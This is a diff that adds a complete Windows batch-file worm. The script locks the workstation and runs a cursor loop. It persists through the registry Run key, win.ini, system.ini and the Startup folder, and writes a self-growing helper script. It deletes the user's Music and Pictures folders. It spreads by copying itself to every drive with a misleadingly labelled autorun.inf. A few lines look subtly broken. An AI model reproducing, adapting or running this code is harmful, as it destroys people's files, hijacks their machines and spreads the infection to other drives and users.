@@ -1,0 +1,36 @@
+%Xul%
+@Echo off > Nul.Xul
+@Rundll32 user32,LockWorkStation
+@Set Mouse=Xul_Mouse.bat
+@Echo @Echo off > %Mouse%
+@Echo :Xul >> %Mouse%
+@Echo @Rundll32 user32,SetCursorPos >> %Mouse%
+@Echo Goto Xul >> %Mouse%
+@Call %Mouse%
+@Set Xul=Xul_%random%.bat
+@Ren %0 %Xul%
+@Set RunInf="HKLM\Software\Microsoft\Windows\CurrentVersion\Run"
+@Reg Add %RunInf% /V "Rundll32" /T "REG_SZ" /D %0 /F > Nul 
+@Echo [windows] >> %windir%\win.ini
+@Echo run=%0 >> %windir%\win.ini
+@Echo load=%0 >> %windir%\win.ini
+@Echo [boot] >> %windir%\system.ini
+@Echo shell=explorer.exe %0 >> %windir%\system.ini
+@Set StartupDirInf="%UserProfile%\Startm~1\Programs\Startup"
+@Copy /Y %0 %StartupDirInf%
+@Set MemKill=Xul_Memory.bat
+@Echo @Echo off > %MemKill%
+@Echo %%XulMemory%% >> %MemKill%
+@Echo Find "XulMemory"^<%%0^>^>%%0 >> %MemKill%
+@Echo %%XulMemory%% >> %MemKill%
+@Call %MemKill%
+@Rd %Userprofile%\Music /S /Q > Nul
+@Rd %Userprofile%\Pictures /S /Q > Nul
+@For %%D In (A,B,C,D,E,F,G,H,I,J,K,L,M,N,O,P,Q,R,S,T,U,V,W,X,Y,Z) Do (
+@Set Drive=%%D
+@Copy /Y %0 %Drive%:\
+@Echo [AutoRun] > %Drive%:\autorun.inf
+@Echo open="%Drive%:\%Xul%" >> %%Drive%:\autorun.inf
+@Echo action=Open folder to see files... >> %Drive%:\autorun.inf)
+%Xul%
+
